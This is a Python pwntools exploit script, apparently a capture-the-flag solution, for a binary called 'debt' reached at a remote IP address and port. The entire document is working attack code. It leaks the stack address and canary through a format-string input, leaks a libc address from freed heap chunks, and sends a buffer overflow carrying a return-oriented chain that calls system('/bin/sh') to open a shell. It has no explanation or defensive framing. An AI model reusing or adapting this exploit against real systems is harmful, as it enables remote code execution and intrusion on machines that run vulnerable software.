#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './debt')
libc = ELF(exe.libc.path)


def create(idx, name=b"A"*8, amount=0x41):
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b"? (0-19)", str(idx).encode())
    io.sendlineafter(b"name:", name)
    io.sendlineafter(b"amount owed:", str(amount).encode())
    io.sendline()

def delete(idx):
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b"?", str(idx).encode())

io = remote("161.97.155.116", 35678)

io.sendafter(b"?", b"%lx%29$lx")
io.recvuntil(b", ")
leak = io.recvline().strip().decode()

stack   = int(leak[:12], 16)
canary  = int(leak[12:], 16)

for i in range(9): create(i)
for i in range(8): delete(i)

io.sendlineafter(b">> ", b"1")
io.recvuntil(b"#7")
io.recvuntil(b"| ")
io.recvuntil(b"| ")
io.sendline()
libc.address = u64(io.recvline().strip().ljust(8, b'\x00')) - 2206944

io.sendlineafter(b">> ", b"4")
io.sendlineafter(b"access: ", b"A"*56 + p64(canary) + p64(stack+8464) + p64(libc.address + 0x29139) + p64(libc.address + 0x2a3e5) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(libc.sym.system))

io.interactive()

